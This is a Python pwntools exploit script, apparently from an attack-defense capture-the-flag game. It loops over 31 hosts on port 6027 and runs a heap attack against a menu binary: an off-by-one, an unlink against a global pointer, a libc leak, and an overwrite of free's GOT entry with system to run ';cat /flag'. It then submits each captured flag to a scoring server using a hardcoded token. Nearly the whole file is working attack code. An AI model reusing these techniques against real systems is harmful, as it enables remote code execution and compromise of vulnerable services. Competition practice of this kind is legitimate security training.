from pwn import *
import requests
context.terminal = ['gnome-terminal','-x','sh','-c']

ips = ['172.20.5.1', '172.20.5.2', '172.20.5.3', '172.20.5.4', '172.20.5.5', '172.20.5.6', '172.20.5.7',
  '172.20.5.8', '172.20.5.9', '172.20.5.10', '172.20.5.11', '172.20.5.12', '172.20.5.13', '172.20.5.14',
           '172.20.5.15', '172.20.5.16', '172.20.5.17', '172.20.5.18', '172.20.5.19', '172.20.5.20', '172.20.5.21', '172.20.5.22', '172.20.5.23',  '172.20.5.24', '172.20.5.25','172.20.5.26', '172.20.5.27','172.20.5.28',
           '172.20.5.29', '172.20.5.30',"172.20.5.31"]



def submit(flag):
    token = "fba23d1a70e254ee4b6e72097a5be4db"
    url = "https://172.20.1.1/Common/awd_sub_answer"
    
    try:
        data = {'answer':flag, 'token':token}
        r = requests.post(url, data=data, verify=False)
        print(r.text)
    except Exception as e:
        print(e)

#io=process('./pwn')

for i in ips:
	try:
		io=remote(i,6027)
		io.recvuntil('>>')
		io.sendline('2')
		libc=ELF('./libc-2.23.so')

		def add(idx,size):
		    io.recvuntil('choice: ')
		    io.sendline('1')
		    io.recvuntil('Index: ')
		    io.sendline(str(idx))
		    io.recvuntil('size:')
		    io.sendline(str(size))

		def show(idx):
		    io.recvuntil('choice: ')
		    io.sendline('3')
		    io.recvuntil('Index: ')
		    io.sendline(str(idx))

		def edit(idx,data):
		    io.recvuntil('choice: ')
		    io.sendline('2')
		    io.recvuntil('Index: ')
		    io.sendline(str(idx))
		    io.recvuntil('Content:')
		    io.send(data)

		def free(idx):
		    io.recvuntil('choice: ')
		    io.sendline('4')
		    io.recvuntil('Index: ')
		    io.sendline(str(idx))   

		def magic(idx,data):
		    io.recvuntil('choice: ')
		    io.sendline('666')
		    io.recvuntil('Index: ')
		    io.sendline(str(idx))
		    io.recvuntil('Content:')
		    io.send(data)

		'''
		add(3,0x80)
		add(4,0x6f)
		add(6,0xa0)
		add(0,0x6f)
		add(1,0x110)
		add(2,0x100)

		free(6)

		edit(0,'b'*(0x6f-0x10))
		edit(1,'b'*0xf0+p64(0x21))
		magic(0,'b'*(0x69+8-0xf))
		magic(0,'0'*0x68+p8(0x40))

		free(3)
		free(1)

		add(7,0x80)
		'''

		add(3,0x80)
		add(4,0x90)
		add(0,0x6f)
		add(1,0x110)
		add(2,0x100)
		add(7,0x100)
		edit(7,';cat /flag\x00')

		edit(0,'b'*(0x6f-0x10))
		edit(1,'a'*0xf0+p64(0x21))
		magic(0,'a'*(0x69+8-0xf))
		magic(0,'0'*0x68+p8(0xb0))

		free(3)
		free(1)

		add(5,0x1b0)
		add(6,0xe0)

		ptr=0x6021a0

		edit(5,'a'*0x88+p64(0)+p64(0x91)+p64(ptr-0x18)+p64(ptr-0x10)+'a'*0x70+p64(0x90)+p64(0x90)+'dddddddddd')
		free(0)
		free_got=0x602010


		edit(4,p64(free_got))
		show(2)

		libc_base=u64(io.recvuntil('\x7f',timeout=0.2)[-6:].ljust(8,'\x00'))-libc.sym['free']
		sys=libc_base+libc.sym['system']
		edit(2,p64(sys))
		free(7)
		io.recvuntil("{")
		flag="flag{"+io.recvline()[:-1]
		print(flag)
		submit(flag)
	except:
		pass
#malloc_hook=libc_base+libc.sym['__malloc_hook']
#one_gadget=libc_base+0xf02a4
#realloc = libc_base + libc.symbols['__libc_realloc']



#edit(6,'a'*0x88+p64(0)+p64(0x91)+p64(ptr-0x10)+p64(ptr-0x18))



#gdb.attach(io)


io.interactive()
